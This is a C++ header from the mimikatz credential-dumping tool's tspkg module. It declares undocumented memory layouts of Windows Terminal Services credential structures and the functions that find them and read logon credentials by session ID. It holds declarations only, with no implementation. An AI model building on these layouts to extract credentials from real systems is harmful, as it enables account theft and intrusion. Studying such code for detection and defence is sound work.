/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#pragma once
#include "../mod_mimikatz_sekurlsa.h"

class mod_mimikatz_sekurlsa_tspkg {

private:
	typedef struct _KIWI_TS_PRIMARY_CREDENTIAL {
		PVOID unk0;	// lock ?
		KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
	} KIWI_TS_PRIMARY_CREDENTIAL, *PKIWI_TS_PRIMARY_CREDENTIAL;

	typedef struct _KIWI_TS_CREDENTIAL {
	#ifdef _M_X64
		BYTE unk0[108];
	#elif defined _M_IX86
		BYTE unk0[64];
	#endif
		LUID LocallyUniqueIdentifier;
		PVOID unk1;
		PVOID unk2;
		PKIWI_TS_PRIMARY_CREDENTIAL pTsPrimary;
	} KIWI_TS_CREDENTIAL, *PKIWI_TS_CREDENTIAL;

	static PRTL_AVL_TABLE TSGlobalCredTable;
	static bool searchTSPKGFuncs();

public:
	static mod_process::PKIWI_VERY_BASIC_MODULEENTRY pModTSPKG;
	static bool getTsPkg(vector<wstring> * arguments);
	static bool WINAPI getTsPkgLogonData(__in PLUID logId, __in bool justSecurity);
};
